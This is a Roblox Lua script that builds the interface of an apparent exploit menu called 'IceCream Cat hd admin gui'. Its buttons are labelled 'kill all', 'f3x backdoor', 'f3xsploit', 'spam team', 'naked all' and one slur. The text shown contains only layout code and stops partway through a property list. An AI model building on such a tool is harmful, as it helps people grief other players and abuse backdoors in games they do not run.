--[[
  _____          _____                             _____      _   
 |_   _|        / ____|                           / ____|    | |  
   | |  ___ ___| |     _ __ ___  __ _ _ __ ___   | |     __ _| |_ 
   | | / __/ _ \ |    | '__/ _ \/ _` | '_ ` _ \  | |    / _` | __|
  _| || (_|  __/ |____| | |  __/ (_| | | | | | | | |___| (_| | |_ 
 |_____\___\___|\_____|_|  \___|\__,_|_| |_| |_|  \_____\__,_|\__|
                                                                  
this script is not obfuscated, learn from it if you want to! :D
  ]]

-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local main = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local close = Instance.new("TextButton")
local _1 = Instance.new("TextButton")
local _2 = Instance.new("TextButton")
local page_1 = Instance.new("Frame")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local TextButton_3 = Instance.new("TextButton")
local TextButton_4 = Instance.new("TextButton")
local TextButton_5 = Instance.new("TextButton")
local TextButton_6 = Instance.new("TextButton")
local TextButton_7 = Instance.new("TextButton")
local TextButton_8 = Instance.new("TextButton")
local TextButton_9 = Instance.new("TextButton")
local TextButton_10 = Instance.new("TextButton")
local TextButton_11 = Instance.new("TextButton")
local TextButton_12 = Instance.new("TextButton")
local TextButton_13 = Instance.new("TextButton")
local TextButton_14 = Instance.new("TextButton")
local TextButton_15 = Instance.new("TextButton")
local TextButton_16 = Instance.new("TextButton")
local TextButton_17 = Instance.new("TextButton")
local TextButton_18 = Instance.new("TextButton")
local TextButton_19 = Instance.new("TextButton")
local TextButton_20 = Instance.new("TextButton")
local TextButton_21 = Instance.new("TextButton")
local TextButton_22 = Instance.new("TextButton")
local TextButton_23 = Instance.new("TextButton")
local TextButton_24 = Instance.new("TextButton")
local TextButton_25 = Instance.new("TextButton")
local TextButton_26 = Instance.new("TextButton")
local TextButton_27 = Instance.new("TextButton")
local TextButton_28 = Instance.new("TextButton")
local TextButton_29 = Instance.new("TextButton")
local TextButton_30 = Instance.new("TextButton")
local page_2 = Instance.new("Frame")
local TextButton_31 = Instance.new("TextButton")
local TextButton_32 = Instance.new("TextButton")
local TextButton_33 = Instance.new("TextButton")
local TextButton_34 = Instance.new("TextButton")
local TextButton_35 = Instance.new("TextButton")
local TextButton_36 = Instance.new("TextButton")
local TextButton_37 = Instance.new("TextButton")
local TextButton_38 = Instance.new("TextButton")
local TextButton_39 = Instance.new("TextButton")
local TextButton_40 = Instance.new("TextButton")
local TextButton_41 = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

main.Name = "main"
main.Parent = ScreenGui
main.Active = true
main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
main.BorderColor3 = Color3.fromRGB(0, 0, 0)
main.BorderSizePixel = 0
main.Draggable = true
main.Position = UDim2.new(0.232771829, 17, 0.15335463, 4)
main.Size = UDim2.new(0, 686, 0, 432)
main.Image = "rbxassetid://13333189485"

TextLabel.Parent = main
TextLabel.BackgroundColor3 = Color3.fromRGB(142, 0, 255)
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Size = UDim2.new(0, 686, 0, 50)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "IceCream Cat hd admin gui :P"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

close.Name = "close"
close.Parent = TextLabel
close.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
close.BorderColor3 = Color3.fromRGB(0, 0, 0)
close.BorderSizePixel = 0
close.Position = UDim2.new(0.949325502, 0, 0, 0)
close.Size = UDim2.new(0, 34, 0, 34)
close.Font = Enum.Font.SourceSans
close.Text = "X"
close.TextColor3 = Color3.fromRGB(0, 0, 0)
close.TextScaled = true
close.TextSize = 14.000
close.TextWrapped = true

_1.Name = "1"
_1.Parent = TextLabel
_1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
_1.BorderColor3 = Color3.fromRGB(0, 0, 0)
_1.BorderSizePixel = 0
_1.Position = UDim2.new(0.342565596, 0, 7.86000013, 0)
_1.Size = UDim2.new(0, 74, 0, 32)
_1.Font = Enum.Font.SourceSans
_1.Text = "page 1"
_1.TextColor3 = Color3.fromRGB(0, 0, 0)
_1.TextScaled = true
_1.TextSize = 14.000
_1.TextWrapped = true

_2.Name = "2"
_2.Parent = TextLabel
_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
_2.BorderSizePixel = 0
_2.Position = UDim2.new(0.472303212, 0, 7.86000013, 0)
_2.Size = UDim2.new(0, 74, 0, 32)
_2.Font = Enum.Font.SourceSans
_2.Text = "page 2"
_2.TextColor3 = Color3.fromRGB(0, 0, 0)
_2.TextScaled = true
_2.TextSize = 14.000
_2.TextWrapped = true

page_1.Name = "page_1"
page_1.Parent = main
page_1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
page_1.BackgroundTransparency = 1.000
page_1.BorderColor3 = Color3.fromRGB(0, 0, 0)
page_1.BorderSizePixel = 0
page_1.Position = UDim2.new(0, 0, 0.115740739, 0)
page_1.Size = UDim2.new(0, 686, 0, 375)

TextButton.Parent = page_1
TextButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BackgroundTransparency = 0.450
TextButton.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BorderSizePixel = 3
TextButton.Position = UDim2.new(0.770025313, 0, 0.215273112, 0)
TextButton.Size = UDim2.new(0, 104, 0, 33)
TextButton.Font = Enum.Font.Merriweather
TextButton.Text = "talk all"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true

TextButton_2.Parent = page_1
TextButton_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.BackgroundTransparency = 0.450
TextButton_2.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.BorderSizePixel = 3
TextButton_2.Position = UDim2.new(0.207343102, 0, 0.369939774, 0)
TextButton_2.Size = UDim2.new(0, 104, 0, 33)
TextButton_2.Font = Enum.Font.Merriweather
TextButton_2.Text = "notice all"
TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 14.000
TextButton_2.TextWrapped = true

TextButton_3.Parent = page_1
TextButton_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.BackgroundTransparency = 0.450
TextButton_3.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.BorderSizePixel = 3
TextButton_3.Position = UDim2.new(0.577605486, 0, 0.216310218, 0)
TextButton_3.Size = UDim2.new(0, 104, 0, 33)
TextButton_3.Font = Enum.Font.Merriweather
TextButton_3.Text = "spam team"
TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.TextScaled = true
TextButton_3.TextSize = 14.000
TextButton_3.TextWrapped = true

TextButton_4.Parent = page_1
TextButton_4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.BackgroundTransparency = 0.450
TextButton_4.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.BorderSizePixel = 3
TextButton_4.Position = UDim2.new(0.389558852, 0, 0.0699768439, 0)
TextButton_4.Size = UDim2.new(0, 104, 0, 33)
TextButton_4.Font = Enum.Font.Merriweather
TextButton_4.Text = "message"
TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.TextScaled = true
TextButton_4.TextSize = 14.000
TextButton_4.TextWrapped = true

TextButton_5.Parent = page_1
TextButton_5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_5.BackgroundTransparency = 0.450
TextButton_5.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_5.BorderSizePixel = 3
TextButton_5.Position = UDim2.new(0.768567562, 0, 0.0696435571, 0)
TextButton_5.Size = UDim2.new(0, 104, 0, 33)
TextButton_5.Font = Enum.Font.Merriweather
TextButton_5.Text = "music1_noescape"
TextButton_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_5.TextScaled = true
TextButton_5.TextSize = 14.000
TextButton_5.TextWrapped = true

TextButton_6.Parent = page_1
TextButton_6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_6.BackgroundTransparency = 0.450
TextButton_6.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_6.BorderSizePixel = 3
TextButton_6.Position = UDim2.new(0.0222119037, 0, 0.216310218, 0)
TextButton_6.Size = UDim2.new(0, 104, 0, 33)
TextButton_6.Font = Enum.Font.Merriweather
TextButton_6.Text = "disco"
TextButton_6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_6.TextScaled = true
TextButton_6.TextSize = 14.000
TextButton_6.TextWrapped = true

TextButton_7.Parent = page_1
TextButton_7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_7.BackgroundTransparency = 0.450
TextButton_7.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_7.BorderSizePixel = 3
TextButton_7.Position = UDim2.new(0.580520928, 0, 0.0699768439, 0)
TextButton_7.Size = UDim2.new(0, 104, 0, 33)
TextButton_7.Font = Enum.Font.Merriweather
TextButton_7.Text = "name all"
TextButton_7.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_7.TextScaled = true
TextButton_7.TextSize = 14.000
TextButton_7.TextWrapped = true

TextButton_8.Parent = page_1
TextButton_8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_8.BackgroundTransparency = 0.450
TextButton_8.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_8.BorderSizePixel = 3
TextButton_8.Position = UDim2.new(0.392474294, 0, 0.216310218, 0)
TextButton_8.Size = UDim2.new(0, 104, 0, 33)
TextButton_8.Font = Enum.Font.Merriweather
TextButton_8.Text = "alert all"
TextButton_8.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_8.TextScaled = true
TextButton_8.TextSize = 14.000
TextButton_8.TextWrapped = true

TextButton_9.Parent = page_1
TextButton_9.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_9.BackgroundTransparency = 0.450
TextButton_9.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_9.BorderSizePixel = 3
TextButton_9.Position = UDim2.new(0.0207541771, 0, 0.369939774, 0)
TextButton_9.Size = UDim2.new(0, 104, 0, 33)
TextButton_9.Font = Enum.Font.Merriweather
TextButton_9.Text = "spin all"
TextButton_9.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_9.TextScaled = true
TextButton_9.TextSize = 14.000
TextButton_9.TextWrapped = true

TextButton_10.Parent = page_1
TextButton_10.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_10.BackgroundTransparency = 0.450
TextButton_10.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_10.BorderSizePixel = 3
TextButton_10.Position = UDim2.new(0.580520928, 0, 0.369939774, 0)
TextButton_10.Size = UDim2.new(0, 104, 0, 33)
TextButton_10.Font = Enum.Font.Merriweather
TextButton_10.Text = "shake all"
TextButton_10.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_10.TextScaled = true
TextButton_10.TextSize = 14.000
TextButton_10.TextWrapped = true

TextButton_11.Parent = page_1
TextButton_11.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_11.BackgroundTransparency = 0.450
TextButton_11.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_11.BorderSizePixel = 3
TextButton_11.Position = UDim2.new(0.0222119037, 0, 0.0699768439, 0)
TextButton_11.Size = UDim2.new(0, 104, 0, 33)
TextButton_11.Font = Enum.Font.Merriweather
TextButton_11.Text = "get btools"
TextButton_11.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_11.TextScaled = true
TextButton_11.TextSize = 14.000
TextButton_11.TextWrapped = true

TextButton_12.Parent = page_1
TextButton_12.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_12.BackgroundTransparency = 0.450
TextButton_12.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_12.BorderSizePixel = 3
TextButton_12.Position = UDim2.new(0.580520928, 0, 0.659310222, 0)
TextButton_12.Size = UDim2.new(0, 104, 0, 33)
TextButton_12.Font = Enum.Font.Merriweather
TextButton_12.Text = "poll"
TextButton_12.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_12.TextScaled = true
TextButton_12.TextSize = 14.000
TextButton_12.TextWrapped = true

TextButton_13.Parent = page_1
TextButton_13.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_13.BackgroundTransparency = 0.450
TextButton_13.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_13.BorderSizePixel = 3
TextButton_13.Position = UDim2.new(0.207343102, 0, 0.0699768439, 0)
TextButton_13.Size = UDim2.new(0, 104, 0, 33)
TextButton_13.Font = Enum.Font.Merriweather
TextButton_13.Text = "hint"
TextButton_13.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_13.TextScaled = true
TextButton_13.TextSize = 14.000
TextButton_13.TextWrapped = true

TextButton_14.Parent = page_1
TextButton_14.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_14.BackgroundTransparency = 0.450
TextButton_14.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_14.BorderSizePixel = 3
TextButton_14.Position = UDim2.new(0.392474294, 0, 0.369939774, 0)
TextButton_14.Size = UDim2.new(0, 104, 0, 33)
TextButton_14.Font = Enum.Font.Merriweather
TextButton_14.Text = "n-word"
TextButton_14.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_14.TextScaled = true
TextButton_14.TextSize = 14.000
TextButton_14.TextWrapped = true

TextButton_15.Parent = page_1
TextButton_15.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_15.BackgroundTransparency = 0.450
TextButton_15.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_15.BorderSizePixel = 3
TextButton_15.Position = UDim2.new(0.0222119037, 0, 0.512902677, 0)
TextButton_15.Size = UDim2.new(0, 104, 0, 33)
TextButton_15.Font = Enum.Font.Merriweather
TextButton_15.Text = "kill all"
TextButton_15.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_15.TextScaled = true
TextButton_15.TextSize = 14.000
TextButton_15.TextWrapped = true

TextButton_16.Parent = page_1
TextButton_16.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_16.BackgroundTransparency = 0.450
TextButton_16.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_16.BorderSizePixel = 3
TextButton_16.Position = UDim2.new(0.207343102, 0, 0.216310218, 0)
TextButton_16.Size = UDim2.new(0, 104, 0, 33)
TextButton_16.Font = Enum.Font.Merriweather
TextButton_16.Text = "avatar all"
TextButton_16.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_16.TextScaled = true
TextButton_16.TextSize = 14.000
TextButton_16.TextWrapped = true

TextButton_17.Parent = page_1
TextButton_17.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_17.BackgroundTransparency = 0.450
TextButton_17.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_17.BorderSizePixel = 3
TextButton_17.Position = UDim2.new(0.768567562, 0, 0.368902743, 0)
TextButton_17.Size = UDim2.new(0, 104, 0, 33)
TextButton_17.Font = Enum.Font.Merriweather
TextButton_17.Text = "stop music"
TextButton_17.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_17.TextScaled = true
TextButton_17.TextSize = 14.000
TextButton_17.TextWrapped = true

TextButton_18.Parent = page_1
TextButton_18.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_18.BackgroundTransparency = 0.450
TextButton_18.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_18.BorderSizePixel = 3
TextButton_18.Position = UDim2.new(0.0201827064, 0, 0.659810126, 0)
TextButton_18.Size = UDim2.new(0, 104, 0, 33)
TextButton_18.Font = Enum.Font.Merriweather
TextButton_18.Text = "f3x backdoor"
TextButton_18.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_18.TextScaled = true
TextButton_18.TextSize = 14.000
TextButton_18.TextWrapped = true

TextButton_19.Parent = page_1
TextButton_19.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_19.BackgroundTransparency = 0.450
TextButton_19.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_19.BorderSizePixel = 3
TextButton_19.Position = UDim2.new(0.207343102, 0, 0.511865735, 0)
TextButton_19.Size = UDim2.new(0, 104, 0, 33)
TextButton_19.Font = Enum.Font.Merriweather
TextButton_19.Text = "spam message"
TextButton_19.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_19.TextScaled = true
TextButton_19.TextSize = 14.000
TextButton_19.TextWrapped = true

TextButton_20.Parent = page_1
TextButton_20.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_20.BackgroundTransparency = 0.450
TextButton_20.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_20.BorderSizePixel = 3
TextButton_20.Position = UDim2.new(0.768567562, 0, 0.512791574, 0)
TextButton_20.Size = UDim2.new(0, 104, 0, 33)
TextButton_20.Font = Enum.Font.Merriweather
TextButton_20.Text = "warp all"
TextButton_20.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_20.TextScaled = true
TextButton_20.TextSize = 14.000
TextButton_20.TextWrapped = true

TextButton_21.Parent = page_1
TextButton_21.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_21.BackgroundTransparency = 0.450
TextButton_21.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_21.BorderSizePixel = 3
TextButton_21.Position = UDim2.new(0.388987362, 0, 0.659810126, 0)
TextButton_21.Size = UDim2.new(0, 104, 0, 33)
TextButton_21.Font = Enum.Font.Merriweather
TextButton_21.Text = "fire all"
TextButton_21.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_21.TextScaled = true
TextButton_21.TextSize = 14.000
TextButton_21.TextWrapped = true

TextButton_22.Parent = page_1
TextButton_22.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_22.BackgroundTransparency = 0.450
TextButton_22.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_22.BorderSizePixel = 3
TextButton_22.Position = UDim2.new(0.206771627, 0, 0.659810126, 0)
TextButton_22.Size = UDim2.new(0, 104, 0, 33)
TextButton_22.Font = Enum.Font.Merriweather
TextButton_22.Text = "naked all"
TextButton_22.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_22.TextScaled = true
TextButton_22.TextSize = 14.000
TextButton_22.TextWrapped = true

TextButton_23.Parent = page_1
TextButton_23.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_23.BackgroundTransparency = 0.450
TextButton_23.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_23.BorderSizePixel = 3
TextButton_23.Position = UDim2.new(0.392474294, 0, 0.511865735, 0)
TextButton_23.Size = UDim2.new(0, 104, 0, 33)
TextButton_23.Font = Enum.Font.Merriweather
TextButton_23.Text = "ban hammer"
TextButton_23.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_23.TextScaled = true
TextButton_23.TextSize = 14.000
TextButton_23.TextWrapped = true

TextButton_24.Parent = page_1
TextButton_24.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_24.BackgroundTransparency = 0.450
TextButton_24.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_24.BorderSizePixel = 3
TextButton_24.Position = UDim2.new(0.577605486, 0, 0.511865735, 0)
TextButton_24.Size = UDim2.new(0, 104, 0, 33)
TextButton_24.Font = Enum.Font.Merriweather
TextButton_24.Text = "cheeseburger all"
TextButton_24.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_24.TextScaled = true
TextButton_24.TextSize = 14.000
TextButton_24.TextWrapped = true

TextButton_25.Parent = page_1
TextButton_25.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_25.BackgroundTransparency = 0.450
TextButton_25.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_25.BorderSizePixel = 3
TextButton_25.Position = UDim2.new(0.764194429, 0, 0.659310222, 0)
TextButton_25.Size = UDim2.new(0, 104, 0, 33)
TextButton_25.Font = Enum.Font.Merriweather
TextButton_25.Text = "face all"
TextButton_25.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_25.TextScaled = true
TextButton_25.TextSize = 14.000
TextButton_25.TextWrapped = true

TextButton_26.Parent = page_1
TextButton_26.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_26.BackgroundTransparency = 0.450
TextButton_26.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_26.BorderSizePixel = 3
TextButton_26.Position = UDim2.new(0.0192964524, 0, 0.803310215, 0)
TextButton_26.Size = UDim2.new(0, 104, 0, 33)
TextButton_26.Font = Enum.Font.Merriweather
TextButton_26.Text = "blind all"
TextButton_26.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_26.TextScaled = true
TextButton_26.TextSize = 14.000
TextButton_26.TextWrapped = true

TextButton_27.Parent = page_1
TextButton_27.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_27.BackgroundTransparency = 0.450
TextButton_27.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_27.BorderSizePixel = 3
TextButton_27.Position = UDim2.new(0.205885366, 0, 0.801921308, 0)
TextButton_27.Size = UDim2.new(0, 104, 0, 33)
TextButton_27.Font = Enum.Font.Merriweather
TextButton_27.Text = "shirt all"
TextButton_27.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_27.TextScaled = true
TextButton_27.TextSize = 14.000
TextButton_27.TextWrapped = true

TextButton_28.Parent = page_1
TextButton_28.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_28.BackgroundTransparency = 0.450
TextButton_28.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_28.BorderSizePixel = 3
TextButton_28.Position = UDim2.new(0.388101131, 0, 0.801921308, 0)
TextButton_28.Size = UDim2.new(0, 104, 0, 33)
TextButton_28.Font = Enum.Font.Merriweather
TextButton_28.Text = "music2_jumpstyle"
TextButton_28.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_28.TextScaled = true
TextButton_28.TextSize = 14.000
TextButton_28.TextWrapped = true

TextButton_29.Parent = page_1
TextButton_29.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_29.BackgroundTransparency = 0.450
TextButton_29.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_29.BorderSizePixel = 3
TextButton_29.Position = UDim2.new(0.580520928, 0, 0.801921308, 0)
TextButton_29.Size = UDim2.new(0, 104, 0, 33)
TextButton_29.Font = Enum.Font.Merriweather
TextButton_29.Text = "music3_kerosene"
TextButton_29.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_29.TextScaled = true
TextButton_29.TextSize = 14.000
TextButton_29.TextWrapped = true

TextButton_30.Parent = page_1
TextButton_30.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_30.BackgroundTransparency = 0.450
TextButton_30.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_30.BorderSizePixel = 3
TextButton_30.Position = UDim2.new(0.770025313, 0, 0.801921308, 0)
TextButton_30.Size = UDim2.new(0, 104, 0, 33)
TextButton_30.Font = Enum.Font.Merriweather
TextButton_30.Text = "sword"
TextButton_30.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_30.TextScaled = true
TextButton_30.TextSize = 14.000
TextButton_30.TextWrapped = true

page_2.Name = "page_2"
page_2.Parent = main
page_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
page_2.BackgroundTransparency = 1.000
page_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
page_2.BorderSizePixel = 0
page_2.Position = UDim2.new(0, 0, 0.115740739, 0)
page_2.Size = UDim2.new(0, 686, 0, 375)
page_2.Visible = false

TextButton_31.Parent = page_2
TextButton_31.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_31.BackgroundTransparency = 0.450
TextButton_31.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_31.BorderSizePixel = 3
TextButton_31.Position = UDim2.new(0.0222119037, 0, 0.0525879711, 0)
TextButton_31.Size = UDim2.new(0, 104, 0, 33)
TextButton_31.Font = Enum.Font.Merriweather
TextButton_31.Text = "music4_phonk"
TextButton_31.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_31.TextScaled = true
TextButton_31.TextSize = 14.000
TextButton_31.TextWrapped = true

TextButton_32.Parent = page_2
TextButton_32.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_32.BackgroundTransparency = 0.450
TextButton_32.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_32.BorderSizePixel = 3
TextButton_32.Position = UDim2.new(0.205885366, 0, 0.0525879711, 0)
TextButton_32.Size = UDim2.new(0, 104, 0, 33)
TextButton_32.Font = Enum.Font.Merriweather
TextButton_32.Text = "music5_phonkLoud"
TextButton_32.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_32.TextScaled = true
TextButton_32.TextSize = 14.000
TextButton_32.TextWrapped = true

TextButton_33.Parent = page_2
TextButton_33.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_33.BackgroundTransparency = 0.450
TextButton_33.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_33.BorderSizePixel = 3
TextButton_33.Position = UDim2.new(0.392474294, 0, 0.0525879711, 0)
TextButton_33.Size = UDim2.new(0, 104, 0, 33)
TextButton_33.Font = Enum.Font.Merriweather
TextButton_33.Text = "music6_comet"
TextButton_33.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_33.TextScaled = true
TextButton_33.TextSize = 14.000
TextButton_33.TextWrapped = true

TextButton_34.Parent = page_2
TextButton_34.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_34.BackgroundTransparency = 0.450
TextButton_34.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_34.BorderSizePixel = 3
TextButton_34.Position = UDim2.new(0.570316851, 0, 0.0525879711, 0)
TextButton_34.Size = UDim2.new(0, 104, 0, 33)
TextButton_34.Font = Enum.Font.Merriweather
TextButton_34.Text = "music7_jumpstyle"
TextButton_34.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_34.TextScaled = true
TextButton_34.TextSize = 14.000
TextButton_34.TextWrapped = true

TextButton_35.Parent = page_2
TextButton_35.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_35.BackgroundTransparency = 0.450
TextButton_35.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_35.BorderSizePixel = 3
TextButton_35.Position = UDim2.new(0.205885366, 0, 0.212587968, 0)
TextButton_35.Size = UDim2.new(0, 104, 0, 33)
TextButton_35.Font = Enum.Font.Merriweather
TextButton_35.Text = "f3x toad rain"
TextButton_35.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_35.TextScaled = true
TextButton_35.TextSize = 14.000
TextButton_35.TextWrapped = true

TextButton_36.Parent = page_2
TextButton_36.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_36.BackgroundTransparency = 0.450
TextButton_36.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_36.BorderSizePixel = 3
TextButton_36.Position = UDim2.new(0.392474294, 0, 0.212587968, 0)
TextButton_36.Size = UDim2.new(0, 104, 0, 33)
TextButton_36.Font = Enum.Font.Merriweather
TextButton_36.Text = "f3xsploit"
TextButton_36.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_36.TextScaled = true
TextButton_36.TextSize = 14.000
TextButton_36.TextWrapped = true

TextButton_37.Parent = page_2
TextButton_37.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_37.BackgroundTransparency = 0.450
TextButton_37.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_37.BorderSizePixel = 3
TextButton_37.Position = UDim2.new(0.745243967, 0, 0.0525879711, 0)
TextButton_37.Size = UDim2.new(0, 104, 0, 33)
TextButton_37.Font = Enum.Font.Merriweather
TextButton_37.Text = "music8_jumpstyle"
TextButton_37.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_37.TextScaled = true
TextButton_37.TextSize = 14.000
TextButton_37.TextWrapped = true

TextButton_38.Parent = page_2
TextButton_38.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_38.BackgroundTransparency = 0.450
TextButton_38.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_38.BorderSizePixel = 3
TextButton_38.Position = UDim2.new(0.570316851, 0, 0.212587968, 0)
TextButton_38.Size = UDim2.new(0, 104, 0, 33)
TextButton_38.Font = Enum.Font.Merriweather
TextButton_38.Text = "f3x skybox"
TextButton_38.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_38.TextScaled = true
TextButton_38.TextSize = 14.000
TextButton_38.TextWrapped = true

TextButton_39.Parent = page_2
TextButton_39.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_39.BackgroundTransparency = 0.450
TextButton_39.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextButton_39.BorderSizePixel = 3
TextButton_39.Position = UDim2.new(0.745243967, 0, 0.212587968, 0)
